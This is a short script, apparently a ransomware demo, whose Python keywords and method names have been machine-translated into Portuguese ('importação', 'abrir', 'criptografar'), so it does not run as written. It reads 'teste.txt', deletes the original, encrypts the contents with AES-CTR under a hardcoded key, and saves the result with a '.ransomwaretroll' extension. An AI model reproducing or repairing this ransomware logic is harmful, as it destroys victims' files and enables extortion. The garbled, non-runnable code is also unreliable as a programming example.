importação os
importação pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = abrir(file_name, "RB")
file_data = file.ler()
file.fechar()

## remover o arquivo
os.retirar(file_name)

## chave de criptografia
chave = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(chave)

## criptografar o arquivo
crypto_data = aes.criptografar(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = abrir(f'{new_file}','wb')
new_file.escrever(crypto_data)
new_file.fechar()
